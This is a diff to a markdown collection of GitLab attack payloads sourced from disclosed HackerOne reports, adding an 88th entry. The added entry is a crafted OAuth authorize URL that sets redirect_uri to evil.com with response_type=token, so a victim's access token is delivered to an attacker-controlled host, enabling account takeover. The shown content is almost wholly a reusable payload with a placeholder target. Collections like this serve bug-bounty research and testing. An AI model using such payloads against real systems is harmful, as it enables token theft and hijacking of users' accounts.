@@ -1,6 +1,6 @@
 # GitLab
 
-87 payloads.
+88 payloads.
 
 ### `65437ea7`
 
@@ -849,6 +849,15 @@ curl "http://target.com/api/v4/import/github" \
 ```
 
 — [Stored XSS via Kroki diagram](https://hackerone.com/reports/1731349) · GitLab · [vakzz](https://hackerone.com/vakzz) · $13,950.0
+
+### `c9992da1`
+
+```
+https://target.com/site/oauth2/authorize?client_id=b9jLmh8WCLZPBAwWba&redirect_uri=https%3A%2F%2Fevil.com%2Fusers%2Fauth%2Fbitbucket%2Fcallback&response_type=token&state=DoesNotMatter
+```
+
+**Parameter:** `redirect_uri`
+— [Account takeover due to insufficient URL validation on RelayState parameter](https://hackerone.com/reports/1923672) · GitLab · [bull](https://hackerone.com/bull) · $2,450.0
 
 ### `eebd4131`
 
